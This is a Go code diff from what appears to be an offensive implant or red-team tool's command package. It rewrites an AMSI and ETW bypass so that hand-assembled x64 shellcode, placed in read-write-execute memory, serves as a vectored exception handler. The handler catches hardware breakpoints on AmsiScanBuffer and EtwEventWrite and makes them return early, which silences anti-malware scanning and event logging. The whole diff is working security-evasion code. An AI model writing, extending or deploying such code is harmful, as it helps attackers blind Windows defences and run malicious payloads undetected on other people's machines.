@@ -4,6 +4,7 @@
 package commands
 
 import (
+	"encoding/binary"
 	"fmt"
 	"runtime"
 	"sync"
@@ -19,6 +20,7 @@ var (
 	procSuspendThread               = kernel32.NewProc("SuspendThread")
 	procSetThreadContext            = kernel32.NewProc("SetThreadContext")
 	procGetThreadContext            = kernel32.NewProc("GetThreadContext")
+	procVirtualAlloc                = kernel32.NewProc("VirtualAlloc")
 )
 
 // Hardware breakpoint constants
@@ -32,6 +34,8 @@ const (
 	EXCEPTION_CONTINUE_SEARCH    = 0x0
 
 	INFINITE = 0xFFFFFFFF
+
+	// PAGE_EXECUTE_READWRITE is declared in poolpartyinjection.go
 )
 
 // M128A represents a 128-bit value for the CONTEXT FPU/vector area
@@ -111,49 +115,226 @@ type EXCEPTION_POINTERS struct {
 
 // Global state for hardware breakpoint VEH handler
 var (
-	hwbpMutex     sync.Mutex
-	hwbpInstalled bool
-	hwbpAmsiAddr  uintptr // Address of AmsiScanBuffer (0 = not set)
-	hwbpEtwAddr   uintptr // Address of EtwEventWrite (0 = not set)
+	hwbpMutex      sync.Mutex
+	hwbpInstalled  bool
+	hwbpDataBlock  uintptr // Pointer to data block containing target addresses
+	hwbpHandlerMem uintptr // Pointer to executable shellcode handler
 )
 
-// vehHandler is the Vectored Exception Handler callback that intercepts
-// hardware breakpoint exceptions and modifies execution to bypass the
-// target function (AMSI or ETW).
-func vehHandler(exceptionInfo *EXCEPTION_POINTERS) uintptr {
-	if exceptionInfo.ExceptionRecord.ExceptionCode != STATUS_SINGLE_STEP {
-		return EXCEPTION_CONTINUE_SEARCH
+// buildNativeVEHHandler creates a native x64 machine code VEH handler that
+// does NOT depend on the Go runtime, so it can safely execute on non-Go threads
+// (e.g., CLR-created threads). This fixes the crash caused by syscall.NewCallback.
+//
+// The handler is allocated via VirtualAlloc with PAGE_EXECUTE_READWRITE.
+// A separate data block (RW) stores the AMSI and ETW target addresses.
+//
+// Data block layout (16 bytes):
+//
+//	[0x00] uint64: AmsiScanBuffer address (0 = not set)
+//	[0x08] uint64: EtwEventWrite address  (0 = not set)
+//
+// Handler logic (x64 Windows ABI, RCX = EXCEPTION_POINTERS*):
+//  1. Check ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP (0x80000004)
+//  2. Load ContextRecord pointer
+//  3. Compare ContextRecord->Rip against AMSI addr → set Rax = 0x80070057
+//  4. Compare ContextRecord->Rip against ETW addr  → set Rax = 0
+//  5. Simulate RET: pop [Rsp] into Rip, Rsp += 8
+//  6. Clear Dr6
+//  7. Return EXCEPTION_CONTINUE_EXECUTION (-1)
+//  8. If no match → return EXCEPTION_CONTINUE_SEARCH (0)
+func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, dataAddr uintptr, err error) {
+	// Allocate 16-byte data block (RW) for target addresses
+	dataPtr, _, callErr := procVirtualAlloc.Call(
+		0,
+		16,
+		uintptr(MEM_COMMIT|MEM_RESERVE),
+		uintptr(PAGE_READWRITE),
+	)
+	if dataPtr == 0 {
+		return 0, 0, fmt.Errorf("VirtualAlloc for data block failed: %v", callErr)
 	}
 
-	ctx := exceptionInfo.ContextRecord
+	// Write target addresses into data block
+	dataSlice := (*[16]byte)(unsafe.Pointer(dataPtr))
+	binary.LittleEndian.PutUint64(dataSlice[0:8], uint64(amsiAddr))
+	binary.LittleEndian.PutUint64(dataSlice[8:16], uint64(etwAddr))
 
-	// Check if we hit the AMSI breakpoint (Dr0)
-	if hwbpAmsiAddr != 0 && uintptr(ctx.Rip) == hwbpAmsiAddr {
-		// Return E_INVALIDARG (0x80070057) - makes CLR skip AMSI check
-		ctx.Rax = 0x80070057
-		// Pop return address from stack into RIP (simulate RET)
-		retAddr := *(*uint64)(unsafe.Pointer(uintptr(ctx.Rsp)))
-		ctx.Rip = retAddr
-		ctx.Rsp += 8
-		// Re-enable the breakpoint by clearing Dr6
-		ctx.Dr6 = 0
-		return EXCEPTION_CONTINUE_EXECUTION
+	// Build x64 shellcode for VEH handler.
+	// Windows x64 ABI: first arg (EXCEPTION_POINTERS*) is in RCX.
+	//
+	// EXCEPTION_POINTERS layout:
+	//   [+0x00] EXCEPTION_RECORD* ExceptionRecord
+	//   [+0x08] CONTEXT*          ContextRecord
+	//
+	// EXCEPTION_RECORD layout:
+	//   [+0x00] DWORD ExceptionCode
+	//
+	// CONTEXT_AMD64 offsets:
+	//   Dr6  = 0x68
+	//   Rax  = 0x78
+	//   Rsp  = 0x98
+	//   Rip  = 0xF8
+	//
+	var code []byte
+
+	// Function prologue — save non-volatile registers we use
+	code = append(code, 0x55)                         // push rbp
+	code = append(code, 0x48, 0x89, 0xE5)             // mov rbp, rsp
+	code = append(code, 0x53)                         // push rbx
+	code = append(code, 0x41, 0x54)                   // push r12
+	code = append(code, 0x41, 0x55)                   // push r13
+
+	// Load ExceptionRecord pointer: rax = [rcx+0x00]
+	code = append(code, 0x48, 0x8B, 0x01)             // mov rax, [rcx]
+
+	// Check ExceptionCode == STATUS_SINGLE_STEP (0x80000004)
+	// cmp dword [rax], 0x80000004
+	code = append(code, 0x81, 0x38, 0x04, 0x00, 0x00, 0x80) // cmp dword [rax], 0x80000004
+
+	// jne not_ours
+	code = append(code, 0x0F, 0x85) // jne rel32 (patched below)
+	jneNotOursOffset := len(code)
+	code = append(code, 0x00, 0x00, 0x00, 0x00) // placeholder
+
+	// Load ContextRecord pointer: rbx = [rcx+0x08]
+	code = append(code, 0x48, 0x8B, 0x59, 0x08)       // mov rbx, [rcx+0x08]
+
+	// Load Rip from context: r12 = [rbx+0xF8]
+	code = append(code, 0x4C, 0x8B, 0xA3)             // mov r12, [rbx+0xF8]
+	code = append(code, 0xF8, 0x00, 0x00, 0x00)
+
+	// Load data block address into r13
+	// movabs r13, <dataPtr>
+	code = append(code, 0x49, 0xBD)                    // movabs r13, imm64
+	dataPtrBytes := make([]byte, 8)
+	binary.LittleEndian.PutUint64(dataPtrBytes, uint64(dataPtr))
+	code = append(code, dataPtrBytes...)
+
+	// --- Check AMSI address ---
+	// Load amsiAddr from data block: rax = [r13+0x00]
+	code = append(code, 0x49, 0x8B, 0x45, 0x00)       // mov rax, [r13+0x00]
+	// test rax, rax (skip if 0)
+	code = append(code, 0x48, 0x85, 0xC0)             // test rax, rax
+	code = append(code, 0x74) // jz skip_amsi (rel8)
+	jzSkipAmsiOffset := len(code)
+	code = append(code, 0x00) // placeholder
+
+	// cmp r12, rax (compare Rip with amsiAddr)
+	code = append(code, 0x4C, 0x39, 0xE0)             // cmp rax, r12
+	code = append(code, 0x75) // jne skip_amsi (rel8)
+	jneSkipAmsiOffset := len(code)
+	code = append(code, 0x00) // placeholder
+
+	// AMSI match: set Rax in context to E_INVALIDARG (0x80070057)
+	// Use mov eax, imm32 (zero-extends to 64-bit) then store to context
+	code = append(code, 0xB8, 0x57, 0x00, 0x07, 0x80) // mov eax, 0x80070057
+	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+disp32], rax
+	code = append(code, 0x78, 0x00, 0x00, 0x00)       // disp32 = 0x78 (Rax offset)
+
+	// jmp do_ret
+	code = append(code, 0xEB) // jmp rel8
+	jmpDoRetFromAmsi := len(code)
+	code = append(code, 0x00) // placeholder
+
+	// skip_amsi:
+	skipAmsiTarget := len(code)
+	code[jzSkipAmsiOffset] = byte(skipAmsiTarget - jzSkipAmsiOffset - 1)
+	code[jneSkipAmsiOffset] = byte(skipAmsiTarget - jneSkipAmsiOffset - 1)
+
+	// --- Check ETW address ---
+	// Load etwAddr from data block: rax = [r13+0x08]
+	code = append(code, 0x49, 0x8B, 0x45, 0x08)       // mov rax, [r13+0x08]
+	// test rax, rax
+	code = append(code, 0x48, 0x85, 0xC0)             // test rax, rax
+	code = append(code, 0x74) // jz not_ours_short (rel8)
+	jzNotOursShortOffset := len(code)
+	code = append(code, 0x00) // placeholder
+
+	// cmp r12, rax
+	code = append(code, 0x4C, 0x39, 0xE0)             // cmp rax, r12
+	code = append(code, 0x75) // jne not_ours_short (rel8)
+	jneNotOursShortOffset := len(code)
+	code = append(code, 0x00) // placeholder
+
+	// ETW match: set Rax in context to 0 (STATUS_SUCCESS)
+	// mov qword [rbx+0x78], 0
+	code = append(code, 0x48, 0xC7, 0x83)             // mov qword [rbx+disp32], imm32
+	code = append(code, 0x78, 0x00, 0x00, 0x00)       // disp32 = 0x78 (Rax offset)
+	code = append(code, 0x00, 0x00, 0x00, 0x00)       // imm32 = 0
+
+	// do_ret: simulate RET — pop return address from context stack
+	doRetTarget := len(code)
+	code[jmpDoRetFromAmsi] = byte(doRetTarget - jmpDoRetFromAmsi - 1)
+
+	// Load Rsp from context: rax = [rbx+0x98]
+	code = append(code, 0x48, 0x8B, 0x83)             // mov rax, [rbx+0x98]
+	code = append(code, 0x98, 0x00, 0x00, 0x00)
+
+	// Load return address from stack: rcx = [rax]
+	code = append(code, 0x48, 0x8B, 0x08)             // mov rcx, [rax]
+
+	// Store return address into context Rip: [rbx+0xF8] = rcx
+	code = append(code, 0x48, 0x89, 0x8B)             // mov [rbx+0xF8], rcx
+	code = append(code, 0xF8, 0x00, 0x00, 0x00)
+
+	// Adjust Rsp: [rbx+0x98] = rax + 8
+	code = append(code, 0x48, 0x83, 0xC0, 0x08)       // add rax, 8
+	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+0x98], rax
+	code = append(code, 0x98, 0x00, 0x00, 0x00)
+
+	// Clear Dr6: mov qword [rbx+0x68], 0
+	code = append(code, 0x48, 0xC7, 0x83)             // mov qword [rbx+disp32], imm32
+	code = append(code, 0x68, 0x00, 0x00, 0x00)       // disp32 = 0x68 (Dr6 offset)
+	code = append(code, 0x00, 0x00, 0x00, 0x00)       // imm32 = 0
+
+	// Return EXCEPTION_CONTINUE_EXECUTION (-1 = 0xFFFFFFFF)
+	code = append(code, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF) // mov eax, 0xFFFFFFFF
+
+	// Epilogue
+	code = append(code, 0x41, 0x5D)                   // pop r13
+	code = append(code, 0x41, 0x5C)                   // pop r12
+	code = append(code, 0x5B)                         // pop rbx
+	code = append(code, 0x5D)                         // pop rbp
+	code = append(code, 0xC3)                         // ret
+
+	// not_ours_short: (jump target for ETW misses → fall through to not_ours)
+	notOursShortTarget := len(code)
+	code[jzNotOursShortOffset] = byte(notOursShortTarget - jzNotOursShortOffset - 1)
+	code[jneNotOursShortOffset] = byte(notOursShortTarget - jneNotOursShortOffset - 1)
+
+	// not_ours:
+	notOursTarget := len(code)
+	// Patch the jne rel32 from the ExceptionCode check
+	rel32 := int32(notOursTarget - (jneNotOursOffset + 4))
+	binary.LittleEndian.PutUint32(code[jneNotOursOffset:jneNotOursOffset+4], uint32(rel32))
+
+	// Return EXCEPTION_CONTINUE_SEARCH (0)
+	code = append(code, 0x31, 0xC0)                   // xor eax, eax
+
+	// Epilogue
+	code = append(code, 0x41, 0x5D)                   // pop r13
+	code = append(code, 0x41, 0x5C)                   // pop r12
+	code = append(code, 0x5B)                         // pop rbx
+	code = append(code, 0x5D)                         // pop rbp
+	code = append(code, 0xC3)                         // ret
+
+	// Allocate executable memory and copy shellcode
+	codeSize := uintptr(len(code))
+	codePtr, _, callErr := procVirtualAlloc.Call(
+		0,
+		codeSize,
+		uintptr(MEM_COMMIT|MEM_RESERVE),
+		uintptr(PAGE_EXECUTE_READWRITE),
+	)
+	if codePtr == 0 {
+		return 0, 0, fmt.Errorf("VirtualAlloc for handler shellcode failed: %v", callErr)
 	}
 
-	// Check if we hit the ETW breakpoint (Dr1)
-	if hwbpEtwAddr != 0 && uintptr(ctx.Rip) == hwbpEtwAddr {
-		// Return STATUS_SUCCESS (0) - silently skip ETW event write
-		ctx.Rax = 0
-		// Pop return address from stack into RIP (simulate RET)
-		retAddr := *(*uint64)(unsafe.Pointer(uintptr(ctx.Rsp)))
-		ctx.Rip = retAddr
-		ctx.Rsp += 8
-		// Re-enable the breakpoint by clearing Dr6
-		ctx.Dr6 = 0
-		return EXCEPTION_CONTINUE_EXECUTION
-	}
+	// Copy shellcode to executable memory
+	codeSlice := unsafe.Slice((*byte)(unsafe.Pointer(codePtr)), len(code))
+	copy(codeSlice, code)
 
-	return EXCEPTION_CONTINUE_SEARCH
+	return codePtr, dataPtr, nil
 }
 
 // resolveFunctionAddress loads a DLL and returns the address of the specified function.
@@ -217,8 +398,9 @@ func setThreadDebugRegisters(hThread uintptr, dr0, dr1, dr7 uint64) error {
 	return nil
 }
 
-// SetupHardwareBreakpoints registers a VEH and sets hardware breakpoints on
-// the specified function addresses across all threads in the current process.
+// SetupHardwareBreakpoints registers a native VEH (pure x64 machine code, no Go
+// runtime dependency) and sets hardware breakpoints on the specified function
+// addresses across all threads in the current process.
 // amsiAddr is set in Dr0, etwAddr is set in Dr1.
 func SetupHardwareBreakpoints(amsiAddr, etwAddr uintptr) (string, error) {
 	hwbpMutex.Lock()
@@ -230,20 +412,26 @@ func SetupHardwareBreakpoints(amsiAddr, etwAddr uintptr) (string, error) {
 
 	var output string
 
-	// Store target addresses for the VEH handler
-	hwbpAmsiAddr = amsiAddr
-	hwbpEtwAddr = etwAddr
-
 	// Register VEH if not already done
 	if !hwbpInstalled {
-		cb := syscall.NewCallback(vehHandler)
-		handle, _, err := procAddVectoredExceptionHandler.Call(1, cb)
+		handlerAddr, dataAddr, err := buildNativeVEHHandler(amsiAddr, etwAddr)
+		if err != nil {
+			return "", fmt.Errorf("failed to build native VEH handler: %v", err)
+		}
+		hwbpHandlerMem = handlerAddr
+		hwbpDataBlock = dataAddr
+
+		handle, _, vehErr := procAddVectoredExceptionHandler.Call(1, handlerAddr)
 		if handle == 0 {
-			return "", fmt.Errorf("AddVectoredExceptionHandler failed: %v", err)
+			return "", fmt.Errorf("AddVectoredExceptionHandler failed: %v", vehErr)
 		}
 		hwbpInstalled = true
-		output += "[+] Vectored Exception Handler registered\n"
+		output += "[+] Native VEH handler registered (Go-runtime-independent)\n"
 	} else {
+		// Update target addresses in existing data block
+		dataSlice := (*[16]byte)(unsafe.Pointer(hwbpDataBlock))
+		binary.LittleEndian.PutUint64(dataSlice[0:8], uint64(amsiAddr))
+		binary.LittleEndian.PutUint64(dataSlice[8:16], uint64(etwAddr))
 		output += "[*] VEH already registered, updating breakpoint addresses\n"
 	}
 
